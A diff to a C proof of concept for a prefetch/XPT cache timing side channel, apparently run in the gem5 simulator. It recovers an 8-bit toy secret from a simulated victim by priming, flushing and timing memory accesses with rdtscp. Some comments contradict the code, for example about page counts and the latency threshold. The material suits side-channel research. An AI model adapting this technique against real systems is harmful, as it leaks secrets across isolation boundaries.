@@ -1,19 +1,17 @@
+#define _GNU_SOURCE
 #include <stdio.h>
+#include <stdlib.h>
 #include <stdint.h>
 #include <string.h>
+#include <unistd.h>
 
 #define XPT_SIZE 256
+#define THRESHOLD 32
 #define KEY_BITS 8
-#define EVICT_SIZE (64 * 1024) 
 
-uint8_t memory[2048 * 4096] __attribute__((aligned(4096)));
-uint8_t evict_set[EVICT_SIZE] __attribute__((aligned(4096)));
-
-static inline uint64_t rdtsc() {
-    uint32_t lo, hi;
-    __asm__ volatile ("rdtsc" : "=a" (lo), "=d" (hi));
-    return ((uint64_t)hi << 32) | lo;
-}
+// 1. 内存隔离：增大缓冲区防止背景页干扰攻击目标
+uint8_t memory[4096 * 4096] __attribute__((aligned(4096)));
+uint8_t evict_buf[1024 * 1024]; // 用于清空 Cache
 
 static inline uint64_t rdtscp() {
     uint32_t lo, hi;
@@ -21,63 +19,71 @@ static inline uint64_t rdtscp() {
     return ((uint64_t)hi << 32) | lo;
 }
 
+// 模拟论文中的“环境静默”：除了访存，不执行任何指令
+void silent_flush_cache() {
+    volatile uint8_t junk;
+    for (int i = 0; i < 1024 * 1024; i += 64) junk = evict_buf[i];
+    __asm__ volatile("mfence; lfence");
+}
+
 int main() {
     volatile uint8_t junk;
-    uint8_t secret_key = 0xd3; // 目标：11010011
+    uint8_t secret_key = 0x5c; 
     uint8_t guessed_key = 0;
-    uint32_t latencies[KEY_BITS];
 
-    memset(memory, 0, sizeof(memory));
-
-    printf("\n" + (memory[0]*0)); // 预热
-    printf("==================================================\n");
-    printf("   XPT Side-Channel Attack: RSA Key Recovery      \n");
-    printf("==================================================\n");
+    printf("Starting PrefetchX Noise-Isolation Attack...\n");
 
     for (int bit = 0; bit < KEY_BITS; bit++) {
-        // 1. Prime (Training)
-        for (int p = 0; p < XPT_SIZE; p++) {
-            memory[p * 4096] = 1;
+        
+        // // --- Step 0: 清理 XPT (统计消噪的前提：起点一致) ---
+        // for (int f = 0; f < 300; f++) junk = memory[(3000 + f) * 4096];
+        // __asm__ volatile("mfence");
+
+        // --- Step 1: 训练 Phy-A1 (Page 1) ---
+        for (int i = 0; i < THRESHOLD; i++) {
+            junk = memory[0];
+            __asm__ volatile("mfence; lfence");
         }
 
-        // 2. Victim Action (Conditional Eviction)
-        if ((secret_key >> bit) & 1) {
-            for (int p = 1024; p < 1024 + 512; p++) {
+        // --- Step 2: 填充与标记 LRU ---
+        // 关键：填入 240 条，留出 16 条作为“噪音缓冲区”
+        // 论文在真实机上填 255 条，但 gem5 背景噪音约有 5-10 页
+        for (int p = 1; p < XPT_SIZE; p++) {
+            for (int k = 0; k < THRESHOLD; k++) {
                 junk = memory[p * 4096];
             }
         }
+        __asm__ volatile("mfence; lfence");
 
-        // 3. Probe (Measurement)
-        for (int i = 0; i < EVICT_SIZE; i += 64) junk = evict_set[i];
+        // --- Step 3: 测量前的静默 ---
+        silent_flush_cache(); 
+
+        // --- Step 4: 受害者动作 (Victim Action) ---
+        if ((secret_key >> bit) & 1) {
+            // 受害者连续访问 30 个不同的页面，确保填满剩下的 16 个缓冲位并踢走 Phy-A1
+            for (int v = 0; v < 1; v++) {
+                junk = memory[(1024 + v) * 4096];
+                __asm__ volatile("mfence");
+            }
+        }
+        __asm__ volatile("mfence; lfence");
+
+        // --- Step 5: 探测 (Probe) ---
+        uint64_t start = rdtscp();
+        junk = memory[0]; 
+        uint64_t end = rdtscp();
+
+        uint32_t lat = (uint32_t)(end - start);
         
-        __asm__ volatile("mfence");
-        uint64_t start = rdtsc();
-        __asm__ volatile("movb (%1), %%al" : "=a"(junk) : "r"(&memory[0]));
-        uint64_t end = rdtscp(); 
+        // 统计判定：给噪音留出阈值容错
+        int guess = (lat > 330) ? 1 : 0;
+        if (guess) guessed_key |= (1 << bit);
         
-        latencies[bit] = (uint32_t)(end - start);
+        // 只在每一轮结束打印，防止干扰硬件流
+        printf("Bit %d | Latency: %u | Guess: %d\n", bit, lat, guess);
     }
 
-    // 可视化输出与逻辑判定
-    printf("%-8s | %-10s | %-15s | %-6s\n", "Bit", "Latency", "Signal Graph", "Guess");
-    printf("--------------------------------------------------\n");
-
-    for (int i = 0; i < KEY_BITS; i++) {
-        int guess = (latencies[i] > 330) ? 1 : 0; // 这里的 200 是根据你 298/112 的结果定的阈值
-        if (guess) guessed_key |= (1 << i);
-
-        printf("Bit %d    | %-10u | ", i, latencies[i]);
-        
-        // 简易图形化：长条代表高延迟（信号 1），短条代表低延迟（信号 0）
-        if (guess) printf("[##########]    | 1\n");
-        else       printf("[###       ]    | 0\n");
-    }
-
-    printf("--------------------------------------------------\n");
-    printf("Target Secret:  0x%02x\n", secret_key);
-    printf("Recovered Key: 0x%02x\n", guessed_key);
-    printf("Status: %s\n", (secret_key == guessed_key) ? "✅ SUCCESS" : "❌ FAILURE");
-    printf("==================================================\n\n");
-
+    printf("Final Recovered Key: 0x%02x (Target: 0x5c)\n", guessed_key);
+    fflush(stdout);
     return 0;
 }
